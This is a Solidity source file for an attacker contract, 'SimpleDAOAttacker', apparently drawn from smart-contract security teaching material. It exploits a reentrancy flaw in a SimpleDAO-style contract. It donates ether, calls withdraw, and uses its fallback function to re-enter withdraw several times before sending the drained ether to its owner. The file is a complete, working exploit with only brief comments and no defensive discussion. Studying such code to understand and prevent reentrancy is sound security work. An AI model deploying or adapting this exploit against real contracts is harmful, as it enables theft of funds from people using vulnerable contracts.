pragma solidity ^0.4.2;

interface ISimpleDAO {
    function donate(address to) external payable;
    function withdraw(uint amount) external;
}

contract SimpleDAOAttacker {
    ISimpleDAO public vulnerableContract;
    address public owner;
    uint public attackCount;

    constructor(address _target) public {
        vulnerableContract = ISimpleDAO(_target);
        owner = msg.sender;
    }

    // Start the attack by donating ether to self
    function attack() public payable {
        require(msg.value >= 1 ether);
        vulnerableContract.donate.value(msg.value)(address(this));
        vulnerableContract.withdraw(msg.value);
    }

    // Fallback is triggered during reentrant call
    function () public payable {
        if (attackCount < 5) {  // Limit reentrancy to avoid OOG
            attackCount++;
            vulnerableContract.withdraw(1 ether);
        }
    }

    function collectEther() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}

